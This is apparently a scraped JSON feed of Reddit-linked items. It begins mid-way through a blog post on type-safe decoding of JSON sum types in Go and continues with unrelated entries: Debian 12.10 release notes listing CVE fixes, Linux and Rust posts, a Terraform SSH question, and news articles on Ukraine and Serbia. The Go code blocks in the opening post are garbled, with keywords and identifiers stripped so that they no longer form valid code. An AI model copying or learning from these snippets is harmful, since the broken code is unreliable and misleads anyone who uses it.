Object </code></pre><p>It generates an  method for  that:</p><ul><li>first decodes the JSON to check the  field (this is thanks to the <code>useOneOfDiscriminatorLookup=true</code> codegen option)</li><li>according to the value of , it chooses the appropriate branch and decodes the JSON using the corresponding struct (, , etc.)</li></ul><p>Edited for clarity, it looks something like this:</p><pre><code>a Actiondata  tagged \n\t\tType ActionType  err  jsondatatagged err  err\n\t err  taggedType  ActionType_CreateObject\n\t\terr  jsondataacreateObject ActionType_UpdateObject\n\t\terr  jsondataaupdateObject ActionType_DeleteObject\n\t\terr  jsondataadeleteObject ActionType_DeleteAllObjects\n\t\terr  jsondataadeleteAllObjects</code></pre><p>To get the actual underlying value, the generator creates a method (which I'll name  here) that returns the first non-nil pointer:</p><pre><code>a Action any  acreateObject  acreateObject\n\t aupdateObject  aupdateObject\n\t adeleteObject  adeleteObject\n\t adeleteAllObjects  adeleteAllObjects\n\t</code></pre><p>So this is already a big improvement on my  approach. Since the accessor method to the underlying value returns , I'm now checking the  which can be one of the more precise structs (, , etc.):</p><pre><code>action Action result  v  actionCreateObject\n\t\tresult  fmt vObjectType vObjectID vObjectNameUpdateObject\n\t\tresult  fmt vObjectType vObjectID vObjectNameDeleteObject\n\t\tresult  fmt vIDDeleteAllObjects\n\t\tresult  result\n</code></pre><p>Some issues remain though:</p><ul><li>I \"trust\" the  return value of the accessor method to be one of the action structs (, , etc.) and nothing else</li><li>If I add a \"branch\" (i.e. another action type), I can easily forget to update the  statement in </li></ul><p>Another generator that I tried out, <a href=\"https://github.com/oapi-codegen/oapi-codegen\">oapi-codegen</a>, uses a slightly different approach. It holds on to a  and delays the decoding until we call an equivalent of the  accessor method:</p><pre><code> Action \n\tunion jsonRawMessage\n CreateObject \n\tType   \n\tObject Object a Actionany err</code></pre><p>The decoding works essentially the same, first decode enough to check the  field, then according to its value unmarshal into one of the action structs (, , etc.). The <a href=\"https://pkg.go.dev/encoding/json#example-RawMessage-Unmarshal\"> documentation</a> actually has a similar example.</p><p>Since delaying JSON decoding wasn't particularly useful in my case, I didn't choose this route. But I wanted to mention it for completeness' sake.</p><p>What about  (aka \"Protobuf\")? I found the following particularly interesting in their <a href=\"https://pkg.go.dev/encoding/json#example-RawMessage-Unmarshal\">Go generated code guide</a>:</p><blockquote><p>For a oneof field, the protobuf compiler generates a single field with an interface type . It also generates a struct for each of the singular fields within the oneof. These all implement this  interface.</p></blockquote><p>Let's try it out. Even though we're working with a JSON API, a Protobuf definition for our data model could look like this:</p><pre><code> value  create_object  update_object  delete_object  delete_all_objects  object </code></pre><p>The generated code indeed creates an interface  with a single method, as well as an  struct that holds a field with that interface type:</p><pre><code> Action \n\tValue isAction_Value  isAction_Value  Action_CreateObject \n\tCreateObject CreateObject Action_CreateObject</code></pre><p>Now these two code generators, OpenAPI and Protobuf, will be the inspiration for my second attempt at decoding the JSON sum type in a more type-safe way...</p><h2 tabindex=\"-1\">Decoding JSON sum types in Go, take two</h2><p>After a bit of searching on the topic of \"Go sum types\", I stumbled across this: <a href=\"https://github.com/alecthomas/go-check-sumtype\">go-check-sumtype</a>. From the README:</p><blockquote><p>A typical proxy for representing sum types in Go is to use an interface with an unexported method and define each variant of the sum type in the same package to satisfy said interface. This guarantees that the set of types that satisfy the interface is closed at compile time.</p></blockquote><p>This \"interface with an unexported method\" (also called \"sealed interface\", or \"marker interface\") sounded like a reasonable way to do it. And it's also what the Protobuf codegen seems to be using.</p><p>I replaced my single \"bag of all the fields\"  struct with a sealed interface  and a struct for each variant (, , etc.). Each variant struct implements the interface:</p><pre><code> IsAction  CreateObject \n\tObject Object CreateObject UpdateObject \n\tObject Object UpdateObject DeleteObject \n\tID DeleteObject DeleteAllObjects DeleteAllObjects</code></pre><p>Now I am quite pleased. Not only do these action-specific structs provide more type-safety, but if I forget to handle a variant in my  statement (or if I add a new one that implements the sealed interface), the  linter will catch it instead of getting an error at runtime!</p><pre><code>action Action result  v  actionCreateObject\n\t\tresult  fmt vObjectType vObjectID vObjectNameUpdateObject\n\t\tresult  fmt vObjectType vObjectID vObjectNameDeleteObject\n\t\tresult  fmt vIDDeleteAllObjects\n\t\tresult  result\n</code></pre><p>I still needed to figure out how to decode the JSON sum types payload into this interface and structs. You can't unmarshal into an interface value directly, you need to pass a concrete type. So I created a wrapper struct like so:</p><pre><code> Action \n\tvalue IsAction\n</code></pre><p>I also found the <a href=\"https://github.com/nishanths/exhaustive\">exhaustive</a> linter, so why stop at sum types when you can also have enums! I defined one for action types, which are used as \"tags\" in my tagged union, along with the proper methods for JSON and string representations:</p><pre><code> ActionType \n\tActionType_CreateObject ActionType \n\tActionType_UpdateObject\n\tActionType_DeleteObject\n\tActionType_DeleteAllObjects\nt ActionTypet ActionTypedata t ActionType</code></pre><p>I then defined  for my  wrapper struct like so:</p><pre><code>a Actiondata  tag \n\t\tType ActionType  err  jsondatatag err  err\n\t v IsAction\n\t tagType  ActionType_CreateObject\n\t\tv CreateObject ActionType_UpdateObject\n\t\tv UpdateObject ActionType_DeleteObject\n\t\tv DeleteObject ActionType_DeleteAllObjects\n\t\tv DeleteAllObjects err  jsondata v err  err\n\t\n\n\tavalue  v\n\t</code></pre><p>This works similarly to what we saw in the OpenAPI generated code:</p><ul><li>first decode only what is needed in the JSON to check the  field</li><li>second, according to the value of , choose the appropriate variant struct of the sum type (, , etc.) and use it to decode the JSON payload</li></ul><p>For the other way around, I also defined  for the wrapper struct:</p><pre><code>a Action\n\tv  avalue\n\n\tdata err  jsonv err  err\n\t tagged any\n\t err  jsondatatagged err  err\n\t vCreateObject\n\t\ttagged ActionType_CreateObject\n\tUpdateObject\n\t\ttagged ActionType_UpdateObject\n\tDeleteObject\n\t\ttagged ActionType_DeleteObject\n\tDeleteAllObjects\n\t\ttagged ActionType_DeleteAllObjects\n\t jsontagged</code></pre><ul><li>first encode the wrapped interface as JSON (unlike decoding, we can do this because the interface here will be initialized with an underlying concrete type: , , etc.)</li><li>second, to add the tag in the  field, we do a roundtrip: decode into a , add the tag to that map, and re-encode the map into JSON</li></ul><p>Notice that I use the  linter in  to make sure I handle all possible tags, and I use the  linter in  to make sure I handle all possible variant structs. So given I keep the \"enum\" and \"sum type\" up-to-date, I will have exhaustiveness checking in both these methods (in addition to other methods or functions, such as  we saw earlier).</p><p>That's it! Yes, there is a bit of boilerplate, but if one is using Go they are probably already OK with a little boilerplate here and there. Also, between AI coding assistants and other codegen tools, the cost of boilerplate can be mitigated. And finally there is that thing we say, \"code is read (and maintained) much more often than written\"? So I'd argue the added type-safety and the fact that we catch issues at compile time instead of runtime may be worth the tradeoff.</p><h2 tabindex=\"-1\">Alternative implementations</h2><p>Of course, the implementation described above is only  of decoding JSON sum types in Go. Below are a couple alternatives, some of which we've already mentioned.</p><pre><code> Action \n\tcreateObject     CreateObject\n\tupdateObject     UpdateObject\n\tdeleteObject     DeleteObject\n\tdeleteAllObjects DeleteAllObjects\n</code></pre><pre><code> Action \n\tpayload jsonRawMessage\n</code></pre><p>With the \"sealed interface\" approach I ended up using, I also considered an implementation of  that doesn't require an encode/decode roundtrip to add the tag, at the cost of a bit more boilerplate. It uses <a href=\"https://gobyexample.com/struct-embedding\">struct embedding</a> instead (<a href=\"https://github.com/nicolashery/example-tagged-union/blob/main/go/altjson.go\">full example here</a>):</p><pre><code>a Action data  err  v  avalueCreateObject\n\t\ttagged \n\t\t\tType ActionType \n\t\t\tCreateObject\n\t\t\n\t\t\tType         ActionType_CreateObject\n\t\t\tCreateObjectv\n\t\tdata err  jsontagged data err\n</code></pre><p>Finally, it is worth mentioning that there are different ways to represent sum types in JSON, notably:</p><ul><li> (the one used in this article): <code>{\"type\": \"delete_object\", \"id\": \"1\", \"soft_delete\": true}</code></li><li>: <code>{\"type\": \"delete_object\", \"value\": {\"id\": \"1\", \"soft_delete\": true}}</code></li><li>: <code>{\"delete_object\": {\"id\": \"1\", \"soft_delete\": true}}</code></li></ul><p>The naming is taken from the Rust library <a href=\"https://serde.rs/enum-representations.html\">Serde's documentation</a>, which provides a good explanation and examples for each representation.</p><p>All JSON representations are possible with the Go implementation of sum types described in this post (you can find the adjacently tagged <a href=\"https://github.com/nicolashery/example-tagged-union/blob/main/go/altjson.go\">full example here</a>).</p><h2 tabindex=\"-1\">What Go could have been: V lang?</h2><p>I'll let the project's website do its own marketing:</p><blockquote><p>V is very similar to Go. If you know Go, you already know ≈80% of V.</p></blockquote><blockquote><p>[...] V is very similar to Go, and its domain is similar to Rust's [...]</p></blockquote><p>Wait... The simplicity of Go, but with enums and sum types? Yes, please!</p><p>I tried porting my example to V, and I have to admit it works out quite nicely (<a href=\"https://github.com/nicolashery/example-tagged-union/blob/main/vlang/main.v\">full source here</a>):</p><pre><code>\n\tuser\n\tgroup\n\n\tid   \n\tname \n\tobject Object\n\n\tobject Object\n\n\tid  CreateObject  UpdateObject  DeleteObject  DeleteAllObjects\n\naction Action action \n\t\tCreateObject \n\t\tUpdateObject \n\t\tDeleteObject \n\t\tDeleteAllObjects </code></pre><p>The  expression has exhaustiveness checking, of course. And the  sum type decodes from/encodes to JSON right out-of-the box (with the caveat that, at the time of writing, it uses the adjacently tagged representation with no way of configuring it).</p><p>Before getting too excited it is worth noting that V is very much a niche language, and can't be compared to Go's popularity and ecosystem. Our industry works in mysterious ways, who knows why some languages gain traction while others don't. Also, this might have some truth to it:</p><blockquote><p>There are only two kinds of languages: the ones people complain about and the ones nobody uses.</p><p><strong>Bjarne Stroustrup, The C++ Programming Language</strong></p></blockquote><p>Nevertheless, I found the V language interesting! It's a garbage-collected language that seems to have found a sweet spot between Go's simplicity and Rust's powerful type system.</p><h2 tabindex=\"-1\">Examples in other languages</h2><p>If you made it this far, I'll leave you with a link to <a href=\"https://github.com/nicolashery/example-tagged-union\">this repository</a>. It contains an implementation of the example sum type from this article, with JSON encoding/decoding (where applicable), in the following languages:</p><ul></ul>","contentLength":19031,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcduqh/decoding_json_sum_types_in_go_without_panicking/"},{"title":"Debian point release 12.10.....if you care and use.","url":"https://www.debian.org/News/2025/20250315","date":1742100124,"author":"/u/unixbhaskar","guid":381,"unread":true,"content":"<p>The Debian project is pleased to announce the tenth update of its\nstable distribution Debian 12 (codename ).\nThis point release mainly adds corrections for security issues,\nalong with a few adjustments for serious problems. Security advisories\nhave already been published separately and are referenced where available.</p><p>Please note that the point release does not constitute a new version of Debian\n12 but only updates some of the packages included. There is\nno need to throw away old  media. After installation,\npackages can be upgraded to the current versions using an up-to-date Debian\nmirror.</p><p>Those who frequently install updates from security.debian.org won't have\nto update many packages, and most such updates are\nincluded in the point release.</p><p>New installation images will be available soon at the regular locations.</p><p>Upgrading an existing installation to this revision can be achieved by\npointing the package management system at one of Debian's many HTTP mirrors.\nA comprehensive list of mirrors is available at:</p><p>This stable update adds a few important corrections to the following packages:</p><table border=\"0\" summary=\"\"><tbody><tr><td>Fix crash when modifying userPassword using malformed input [CVE-2024-2199 CVE-2024-8445]; prevent denial of service while attempting to log in with a user with a malformed hash in their password [CVE-2024-5953]; prevent denial of service on the directory server with specially-crafted LDAP query [CVE-2024-3657]</td></tr><tr><td>New upstream bugfix release</td></tr><tr><td>Fix tests causing FTBFS on the auto-builder network</td></tr><tr><td>Fix unintended HTTPS upgrades or premature reversion to HTTP when both subdomains and parent domains are used [CVE-2024-9681]; prevent stopping of stunnel before retries in the built-time tests; fix possible credentials leakage issues [CVE-2024-11053 CVE-2025-0167]; fix test failures due to port clashes</td></tr><tr><td>Do not cache result of get_default_value_for_field</td></tr><tr><td>Fix issue when rendering an invalid monochrome DICOM image [CVE-2024-47796]; ensure: HighBit &lt; BitsAllocated [CVE-2024-52333]; fix possible overflows when allocating memory [CVE-2024-27628]; fix two segmentation faults [CVE-2024-34508 CVE-2024-34509]; fix arbitrary code execution issue [CVE-2024-28130]; fix buffer overflow issues [CVE-2025-25472 CVE-2025-25474]; fix NULL pointer dereference issue [CVE-2025-25475]</td></tr><tr><td>Increase Linux kernel ABI to 6.1.0-32; rebuild against proposed-updates</td></tr><tr><td>Add missing parameters for source upload target</td></tr><tr><td>Fix authentication bypass [CVE-2024-21543]</td></tr><tr><td>Fix overflow condition in PeCoffLoaderRelocateImage() [CVE-2024-38796]; fix potential UINT32 overflow in S3 ResumeCount [CVE-2024-1298]</td></tr><tr><td>Fix tests on machines with 2 vCPU or fewer</td></tr><tr><td>Fix sandbox bypass vulnerability in Nasal scripts [CVE-2025-0781]</td></tr><tr><td>Fix build failure on single-CPU machines</td></tr><tr><td>Fix buffer overflow when printing assertion failure message [CVE-2025-0395]; fix memset performance for unaligned destinations; fix TLS performance degradation after dlopen() usage; avoid integer truncation when parsing CPUID data with large cache sizes; ensure data passed to the rseq syscall are properly initialized</td></tr><tr><td>New upstream security release [CVE-2023-34440 CVE-2023-43758 CVE-2024-24582 CVE-2024-28047 CVE-2024-28127 CVE-2024-29214 CVE-2024-31068 CVE-2024-31157 CVE-2024-36293 CVE-2024-37020 CVE-2024-39279 CVE-2024-39355]</td></tr><tr><td>Fix arbitrary code execution issues [CVE-2024-56201 CVE-2024-56326]</td></tr><tr><td>Fix build failure on single-CPU systems</td></tr><tr><td>Fix CSRF vulnerability on 2FA registration interface [CVE-2024-52948]</td></tr><tr><td>Set correct default permissions for shared memory [CVE-2024-46544]</td></tr><tr><td>Fix buffer overflow vulnerability [CVE-2023-32181 CVE-2023-22652]</td></tr><tr><td>Add option to read username/password from file [CVE-2023-35789]</td></tr><tr><td>Fix out-of-bounds read in gnu_longlink() [CVE-2021-33643]; fix out-of-bounds read in gnu_longname() [CVE-2021-33644]; fix memory leak in th_read() [CVE-2021-33645]; fix memory leak in th_read() [CVE-2021-33646]</td></tr><tr><td>New upstream release; bump ABI to 32</td></tr><tr><td>Fix multi axes movement on single axis G0 MDI call</td></tr><tr><td>New upstream stable release; fix security issue [CVE-2024-21096]; fix denial of service issue [CVE-2025-21490]</td></tr><tr><td>Impose response limits on HTTP server connections [CVE-2025-26819]</td></tr><tr><td>Install fcitx icons to the correct locations</td></tr><tr><td>Ignore test warnings from astropy</td></tr><tr><td>Fix possible bypass of client certificate authentication [CVE-2025-23419]</td></tr><tr><td>Fix CSRF vulnerability [CVE-2023-45857]; fix potential vulnerability in URL when determining an origin [CVE-2024-57965]</td></tr><tr><td>Fix mishandling of non-integer values leading to denial of service in nanoid [CVE-2024-55565]; fix parsing of external untrusted CSS [CVE-2023-44270]</td></tr><tr><td>Fix build failure arising from changed timeout API</td></tr><tr><td>New upstream stable release; harden PQescapeString and allied functions against invalidly-encoded strings; improve behavior of libpq's quoting functions [CVE-2025-1094]</td></tr><tr><td>Fix behavior when parsing chunked transfer encoding bodies and zero-length Content-Length headers [CVE-2023-40175]; limit size of chunk extensions [CVE-2024-21647]; prevent manipulation of headers set by intermediate proxies [CVE-2024-45614]</td></tr><tr><td>Fix regular expression-based denial of service issue [CVE-2023-36053], denial of service issues [CVE-2024-38875 CVE-2024-39614 CVE-2024-41990 CVE-2024-41991], user enumeration issue [CVE-2024-39329], directory traversal issue [CVE-2024-39330], excessive memory consumption issue [CVE-2024-41989], SQL injection issue [CVE-2024-42005]</td></tr><tr><td>Run tests only if /tmp is tmpfs, otherwise they are known to fail</td></tr><tr><td>Avoid segmentation fault if a SIGTERM is received during startup</td></tr><tr><td>Fix parallel running of tests</td></tr><tr><td>Fix sandbox bypass vulnerability in Nasal scripts [CVE-2025-0781]</td></tr><tr><td>Apply GPO policy consistently [CVE-2023-3758]</td></tr><tr><td>Fix vulnerable parsing of control characters in paths served by mod_dav_svn [CVE-2024-46901]</td></tr><tr><td>Ignore test warnings from astropy</td></tr><tr><td>New upstream release; update data for Paraguay; update leap second information</td></tr><tr><td>Fix URL of public Vagrant registry</td></tr><tr><td>Fix crash when expanding  in substitute [CVE-2023-2610]; fix buffer-overflow in vim_regsub_both() [CVE-2023-4738]; fix heap use after free in ins_compl_get_exp() [CVE-2023-4752]; fix heap-buffer-overflow in vim_regsub_both [CVE-2023-4781]; fix buffer-overflow in trunc_string() [CVE-2023-5344]; fix stack-buffer-overflow in option callback functions [CVE-2024-22667]; fix heap-buffer-overflow in ins_typebuf (CVE-2024-43802]; fix use-after-free when closing a buffer [CVE-2024-47814]; fix build failure on 32-bit architectures</td></tr><tr><td>Fix mishandling of semicolons in userinfo in URLs [CVE-2024-38428]</td></tr><tr><td>Allow direct kernel boot with kernels &gt;= 6.12</td></tr></tbody></table><p>This revision adds the following security updates to the stable release.\nThe Security Team has already released an advisory for each of these\nupdates:</p><p>The following packages were removed due to circumstances beyond our control:</p><p>The installer has been updated to include the fixes incorporated\ninto stable by the point release.</p><p>The complete lists of packages that have changed with this revision:</p><p>The current stable distribution:</p><p>Proposed updates to the stable distribution:</p><p>stable distribution information (release notes, errata etc.):</p><p>Security announcements and information:</p><p>The Debian Project is an association of Free Software developers who\nvolunteer their time and effort in order to produce the completely\nfree operating system Debian.</p><p>For further information, please visit the Debian web pages at\n<a href=\"https://www.debian.org/\">https://www.debian.org/</a>, send mail to\n&lt;press@debian.org&gt;, or contact the stable release team at\n&lt;debian-release@lists.debian.org&gt;.</p>","contentLength":7343,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1jcdupk/debian_point_release_1210if_you_care_and_use/"},{"title":"What is Valve's end goal with linux and gaming?","url":"https://www.reddit.com/r/linux/comments/1jcd0vy/what_is_valves_end_goal_with_linux_and_gaming/","date":1742097093,"author":"/u/Karmic_Backlash","guid":384,"unread":true,"content":"<p>I'll be the first to admit that I am a bit of a fan of valve if only at least in Stockholm Syndrome. I own a steamdeck and use their storefront, and have bought many games from them. However, as a linux user, over the years I've developed a strange feeling about their linux push. </p><p>So, first thing thats crossed my mind is their main selling point in the space, Proton (and by proxy, wine). The whole idea is running windows applications and specifically games on linux. But that doesn't really feel like a long term solution. It basically requires that anything to do with gaming necessarily depends on windows and its systems. If people just stopped making windows builds of their stuff then linux gaming would suffer just as much.</p><p>You would think that by now they would have tried to address this, and while I know the classic XKCD joke of \"14 Competing Standards\" rings here, but Valve has the best chance out of everyone to try, even if it fails, they'd still ideally have wine to fall back on.</p><p>My second question is more to do with their lack of any movement outside of gaming. Don't get me wrong, they are a  platform and gaming focused developer. I'm not expecting them to shoulder the whole of the desktop on their shoulders, but it would be a serious feather in their cap to directly advertise that their software can do more then  gaming. The whole desktop mode of their flagship distro is fully featured just like any other.</p><p>Third question, and this is more of a plea for context if it exists then a question, have they said anything about their long term goals anywhere, because I haven't heard anything. I'd love to know if they do actually have a roadmap, if only to know how to set my expectations.</p>","contentLength":1710,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Trump limits Kellogg’s role to Ukraine envoy after Russian complaints","url":"https://www.straitstimes.com/world/europe/trump-limits-kelloggs-role-to-ukraine-envoy-after-russian-complaints","date":1742093341,"author":"/u/Silly-avocatoe","guid":767,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jcbxvk/trump_limits_kelloggs_role_to_ukraine_envoy_after/"},{"title":"Dioxus 0.6 is incredible, why isn't anyone talking about it.","url":"https://www.reddit.com/r/rust/comments/1jcar25/dioxus_06_is_incredible_why_isnt_anyone_talking/","date":1742089413,"author":"/u/Incredible_guy1","guid":375,"unread":true,"content":"<p>Iv'e been using tauri for a while to build my desktop apps and whiles its an amazing tool, a few of my complains include:</p><ul><li>projects become too complex to manage</li></ul><p>Dioxus basically fixes all of this and keeps everything in native rust , while using a tsx-like syntax for building , how does this not get the spotlight?</p>","contentLength":312,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I built a crate to generate LSP servers using Tree-sitter queries.","url":"https://www.reddit.com/r/rust/comments/1jcajk7/i_built_a_crate_to_generate_lsp_servers_using/","date":1742088763,"author":"/u/adclz","guid":564,"unread":true,"content":"<p>This is my second side project in Rust. There are probably some issues, and I haven’t implemented all the features I have in mind yet.</p><p>The main inspiration comes from GitHub’s StackGraph. Since VS Code released an SDK last summer that allows LSP servers to run when compiled to WASI, I wanted to create something that could generate a cross-platform extension from any Tree-sitter grammar.</p><p>It all started as a draft, but I ended up enjoying working on it a bit too much.</p>","contentLength":472,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Macron asserts: 'If Kyiv invites allies onto its soil, Moscow has no say'","url":"https://www.bfmtv.com/international/asie/russie/guerre-en-ukraine-moscou-n-a-pas-son-mot-a-dire-si-kiev-demande-a-des-forces-alliees-d-etre-sur-son-territoire-affirme-macron_AD-202503150383.html","date":1742085729,"author":"/u/Wonderful-Excuse4922","guid":399,"unread":true,"content":"<div>Dans un entretien accordé à plusieurs journeaux régionais français, Emmanuel Macron a par ailleurs affirm qu'il faudra, selon lui, des \"échanges directs\" avec son homologue russe Vladimir Poutine \"et entre négociateurs français et russes pour clarifier cet agenda\" sur les garanties de sécurité à apporter à l'Ukraine.</div><p><a href=\"https://www.bfmtv.com/international/europe/ukraine/guerre-en-ukraine-macron-veut-une-pression-claire-sur-la-russie-qui-ne-donne-pas-l-impression-de-vouloir-la-paix-sincerement_AN-202503150258.html\" title=\"Guerre en Ukraine: Macron veut une &quot;pression claire&quot; sur la Russie qui &quot;ne donne pas l'impression de vouloir la paix sincèrement&quot;\">Emmanuel Macron</a> a affirmé que la Russie n'avait pas à \"accepter ou pas\" l'envoi en Ukraine de \"forces alliées\" si Kiev en fait la \"demande\" pour garantir un éventuel accord de paix, dans un entretien publié samedi 15 mars par plusieurs journaux régionaux français.</p><p>En revanche, \"à partir du moment où on rentrerait dans cette phase de cessez-le-feu\" proposée par Washington et Kiev, il faudra selon lui des \"échanges directs\" avec son homologue russe Vladimir Poutine \"et entre négociateurs français et russes pour clarifier cet agenda\" sur les garanties de sécurité à apporter à l'Ukraine.</p><p>Depuis son retour à la <a href=\"https://www.bfmtv.com/politique/elysee/macron-veut-cooperer-avec-trump-et-appelle-a-ne-pas-etre-faible-face-a-lui_AV-202501060453.html\" title=\"Macron veut &quot;coopérer&quot; avec Trump et appelle à ne pas être &quot;faible&quot; face à lui\">Maison-Blanche</a> en janvier, le président américain <a href=\"https://www.bfmtv.com/international/asie/russie/guerre-en-ukraine-vladimir-poutine-remercie-donald-trump-pour-son-attention-au-conflit_AV-202503130717.html\" title=\"Guerre en Ukraine: Vladimir Poutine remercie Donald Trump pour son &quot;attention&quot; au conflit\">Donald Trump </a>martèle sa volonté de mettre fin au conflit, trois ans après l'invasion russe de l'Ukraine, et a opéré un rapprochement spectaculaire avec le maître du Kremlin. Après une phase de tensions maximales, Américains et Ukrainiens ont renoué le dialogue cette semaine en proposant une trêve d'un mois, que la Russie n'a pas encore acceptée.</p><p>\"C'est un moment de vérité parce que si la Russie ne s'engage pas sincèrement dans la paix\", \"le président Trump va durcir les sanctions et les représailles et donc on changera totalement de dynamique\", a estimé Emmanuel Macron.</p><p>Selon le chef de l'Etat français, \"plusieurs pays européens, et d'ailleurs non européens, ont manifesté leur volonté de se joindre\" à un éventuel envoi de troupes en Ukraine pour garantir un futur accord de paix avec la Russie. Il s'agirait de \"quelques milliers d'hommes\" par Etat, déployés \"dans des points-clés, pour faire des programmes d'entraînement\" et \"montrer notre soutien dans la durée\", a-t-il assuré. Jusqu'ici, Moscou s'oppose fermement à un tel déploiement.</p><blockquote></blockquote><p>\"Les Ukrainiens ne peuvent en aucun cas faire des concessions territoriales et n'avoir aucune garantie de sécurité\", a-t-il prévenu.</p><p>S'agissant du renforcement massif de la défense acté par l'Union européenne la semaine dernière, il a expliqué avoir demandé aux industriels français de l'armement réunis vendredi à l'Elysée de \"démarcher les Etats européens qui ont pris l'habitude d'acheter américain\".</p><p>\"Ceux qui achètent (des missiles) Patriot, il faut leur proposer le SAM-T nouvelle génération franco-italien; ceux qui achètent du F35, il faut leur proposer du Rafale\", a-t-il martelé. Il entend d'ailleurs \"produire plus\" de ces avions de chasse du groupe Dassault Aviation \"plutôt que d'accélérer le programme d'avion du futur\".</p>","contentLength":2846,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/europe/comments/1jc9kwv/macron_asserts_if_kyiv_invites_allies_onto_its/"},{"title":"Deploying Local Kubernetes Cluster with Terraform & KVM","url":"https://www.reddit.com/r/kubernetes/comments/1jc7np0/deploying_local_kubernetes_cluster_with_terraform/","date":1742080018,"author":"/u/rached2023","guid":367,"unread":true,"content":"<p>I'm trying to deploy a local Kubernetes cluster (1 master &amp; 2 workers) using Terraform on KVM-based virtual machines. However, when I run , I keep encountering the following error: </p><p><code>│ interrupted - last error: SSH authentication failed : ssh: handshake failed: ssh: unable to authenticate, attempted methods [none publickey], no supported │ methods remain</code></p><p>and this is my code for ssh : </p><pre><code>variable \"ssh_private_key\" { default = \"/home/rached/.ssh/id_rsa\" type = string } connection { type = \"ssh\" user = var.ssh_user password = var.ssh_password # The password for SSH authentication private_key = file(var.ssh_private_key) host = each.key == \"master1\" ? \"192.168.122.6\" : (each.key == \"worker1\" ? \"192.168.122.197\" : \"192.168.122.184\") timeout = \"5m\" </code></pre><p>I have already: ✅ Checked SSH key permissions<p> ✅ Verified that the public key is added to the VM</p> ✅ Confirmed that SSH is enabled on the VM</p><p>Has anyone faced a similar issue? Any insights or troubleshooting steps would be greatly appreciated!</p>","contentLength":994,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Linux in Furniture Store","url":"https://www.reddit.com/r/linux/comments/1jc76ce/linux_in_furniture_store/","date":1742078627,"author":"/u/S4ndwichGurk3","guid":383,"unread":true,"content":"<p>I was amazed today and have to share this.</p><p>I was in a large furniture store today in Germany and asked an employee about my online order. She went to the PC and I noticed that it runs Linux. It looked like an older version of KDE. Okay, Linux might be getting more popular for such use-cases, if I had a company like this I would also use Linux, so maybe not that special.</p><p>But what really amazed me was their software. It is as simple as it gets: a TUI with green text and black background, no mouse input, all done by keyboard, navigating around, entering in some numbers, and within seconds she printed something for me.</p><p>It reminded me of an opposite example at my health insurance provider, where she had to click and move the mouse for 5 minutes until she printed what I needed.</p>","contentLength":779,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A river ‘died' overnight in Zambia after an acidic waste spill at a Chinese-owned mine","url":"https://apnews.com/article/mining-pollution-china-zambia-environment-93ee91d1156471aaf9a7ebd6f51333c1?fbclid=IwY2xjawJC4UNleHRuA2FlbQIxMQABHSYwd6jBPc-9Ud0ih68QPHXuoDjTBNrmdrbkPe0fy6N_USmK-YK8TgyUmw_aem_jM_aBoBLBDU9_TRAxkBalA","date":1742078489,"author":"/u/kalahiki808","guid":393,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jc74ni/a_river_died_overnight_in_zambia_after_an_acidic/"},{"title":"duck: disk usage analysis tool with an interactive command line interface","url":"https://www.reddit.com/r/linux/comments/1jc6ipp/duck_disk_usage_analysis_tool_with_an_interactive/","date":1742076733,"author":"/u/KryXus05","guid":749,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/KryXus05\"> /u/KryXus05 </a>","contentLength":31,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"PSA: 🌇 async-std has been officially discontinued; use smol instead","url":"https://crates.io/crates/async-std","date":1742076554,"author":"/u/JoshTriplett","guid":377,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1jc6gis/psa_asyncstd_has_been_officially_discontinued_use/"},{"title":"The moment LRAD (owned by the Serbian police) was used during 15 minutes of silence - Belgrade, Serbia","url":"https://n1info.rs/vesti/video-trenutak-incidenta-upotrebljen-zvucni-top-oruzje-koje-poseduje-bezbednosni-sistem-srbije/","date":1742076193,"author":"/u/SkyLunat1c","guid":754,"unread":true,"content":"<p><strong data-attribute-id=\"emphasized-text\">Zvuk koji je prekinuo petnaestominutnu tišinu na današnjem studentskom protestu i izazvao paniku među okupljenima je zvučno oružje ili \"zvučni top\" koji poseduje bezbednosni sistem Srbije, rekao je za N1 Aleksandar Radić, vojni analitičar.</strong></p><p>Radić navodi da je u pitanju američko neletalno, agresivno, zvučno oružje koje za cilj ima da onemogući metu, odnosno, da služi za onesposobljavanje.</p><p>„Najveći problem u večerašnjem događaju je – ko je došao na ideju da se takvo oružje upotrebi? U situaciji kada su svi demonstranti bili mirni, kada se odavala petnaestominutna pošta nastradalima oružje je upotrebljeno. Jedini cilj tog čina je brutalan prikaz sile, dokaz arogancije, a motiv mržnja prema sopstvenom narodu“, navodi za portal N1 Radić.</p><p>On kaže da „zvučni top“ od pre nekoliko godina poseduje bezbednosni sistem Srbije.</p><p>Narodni poslanik Zdravko Ponoš, takođe, navodi i da je prema informacijama koje je on dobio u pitanju zvučno oružje.</p><p>„Ta reakcija okupljenih, da imaju osećaj kao da je nešto prošlo pored njih je posledica upotrebe zvuka, a sa ciljem da se uplaše“, rekao je Ponoš.</p><p>On je objasnio i da osim što se njime izazvala panika, ta vrsta oružja može da se koristi na više načina.</p><p>„Upotreba tog oružja može naštetiti i zdravlju, a to što je upotrebljena u vreme dok je odavana pošta nastradalima je potpuni skandal“, naveo je Zdravko Ponoš.</p>","contentLength":1412,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/europe/comments/1jc6bvi/the_moment_lrad_owned_by_the_serbian_police_was/"},{"title":"'European Defence' by Nicolas 